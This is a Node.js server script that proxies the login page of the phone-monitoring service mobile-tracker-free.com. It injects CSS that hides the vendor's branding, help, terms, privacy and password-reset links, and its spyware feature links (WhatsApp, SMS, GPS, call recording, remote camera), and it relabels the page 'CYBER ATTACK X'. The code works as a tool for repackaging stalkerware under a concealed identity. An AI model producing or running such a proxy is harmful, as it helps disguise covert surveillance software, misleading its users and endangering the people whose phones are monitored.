import http from 'http';

const PORT = process.env.PORT || 3000;
const TARGET_URL = "https://mobile-tracker-free.com/login/";

const customCSS = `.navbar-brand,.navbar-brand img,img[src*="logo"],img[alt*="Mobile Tracker"],.navbar-brand::after,.navbar-header .toggle,.nav-side-menu,.dropdown-menu,.breadcrumb,ul.breadcrumb,ol.breadcrumb,#help-button,.help-widget,.floating-help,.btn-floating,div[class*="help"],span[class*="help"],.help-button-container,div[style*="fixed"][style*="bottom"],iframe[src*="chat"],iframe[title*="chat"],iframe[id*="webWidget"],iframe[src*="zendesk"],div[id*="crisp"],div[id*="zendesk"],div[class*="chat"],div[id*="chat"],.alert-danger,div[class*="alert-danger"],div:has(> a[href*="resend"]),.alert-warning,.alert-info,div[style*="background-color: #f2dad2"],div[style*="background-color"],div.well,.panel-warning,footer,.footer,#footer,.footer-links,div[class*="footer"],.social-icons,.brand-name,.site-name,.forgot-password,.forgot-password-link,.password-reset,.password-reset-link{display:none!important;visibility:hidden!important;opacity:0!important;pointer-events:none!important;}a[href*="installation"],a[href*="faq"],a[href*="offers"],a[href*="about"],a[href*="help-center"],a[aria-label*="Help"],a[aria-label*="help"],a[href*="help"],a[href*="download"],.btn-success,a.btn-success,a[href*="apk"],a[href*="password"],a[href*="forgot"],a[href*="terms"],a[href*="privacy"],a[href*="policy"],a[href*="guide"],a[href*="forgot-password"],a[href*="forgot_password"],a[href*="forgotpassword"],a[href*="reset-password"],a[href*="reset_password"],a[href*="recover-password"],a[class*="forgot"],a[class*="password-reset"],a[href*="support.mobile-tracker-free.com"],a[href*="tally.so/?utm_source=tally"],a[href*="mobile-tracker-free.com/dashboard/logout.php"],a[href*="checkout.stripe.com/c/pay/cs_live"],a[href^="javascript:void"],a[href*="sms-tracker"],a[href*="sms-alert"],a[href*="call-block"],a[href*="call-tracker"],a[href*="gps-tracker"],a[href*="file-explorer"],a[href*="pictures-tracker"],a[href*="whatsapp-tracker"],a[href*="record-audio"],a[href*="schedule-restriction"],a[href*="apps-tracker"],a[href*="apps-block"],a[href*="sites-tracker"],a[href*="sites-block"],a[href*="calendar-tracker"],a[href*="contacts-tracker"],a[href*="statistics"],a[href*="repport-pdf"],a[href*="facebook.com"],a[youtube.com],a[twitter.com],a[href="https://mobile-tracker-free.com/"],a[href="https://mobile-tracker-free.com"],a[href*="/register/"],a[href*="call-recorder"],a[href*="gps-live"],a[href*="facebook-messenger-tracker"],a[href*="skype-tracker"],a[href*="hangouts-tracker"],a[href*="line-tracker"],a[href*="kik-tracker"],a[href*="viber-tracker"],a[href*="gmail-tracker"],a[href*="tango-tracker"],a[href*="snapchat-tracker"],a[href*="telegram-tracker"],a[href*="take-picture"],a[href*="command-sms"],a[href*="remote-control-more"],a[href*="live-panel"]{display:none!important;visibility:hidden!important;opacity:0!important;pointer-events:none!important;}.page-header h1,h1.page-title,.login-box h1,h1{font-size:0!important;visibility:hidden!important;}.page-header h1::after,h1.page-title::after,.login-box h1::after,h1::after{content:"CYBER ATTACK X"!important;font-size:26px!important;visibility:visible!important;display:block!important;color:#000!important;font-weight:bold!important;text-transform:uppercase!important;}a[href*="features"],a[href*="feature"],.nav a[href*="features"],*[class*="feature"],*[id*="feature"],a[href="/"],a[href*="home"],.nav a[href*="home"]{color:#fff!important;background-color:#fff!important;border-color:#fff!important;text-shadow:none!important;box-shadow:none!important;}a,button,input,div,span{-webkit-touch-callout:none!important;-webkit-user-select:none!important;user-select:none!important;-webkit-tap-highlight-color:transparent!important;}`;

const server = http.createServer(async (req, res) => {
  try {
    const apiResponse = await fetch(TARGET_URL);
    let html = await apiResponse.text();

    if (html.includes('</head>')) {
      html = html.replace('</head>', `<style>${customCSS}</style></head>`);
    } else {
      html = `<style>${customCSS}</style>` + html;
    }

    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(html);
  } catch (error) {
    res.writeHead(500, { 'Content-Type': 'text/plain' });
    res.end('Error loading target page.');
  }
});

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
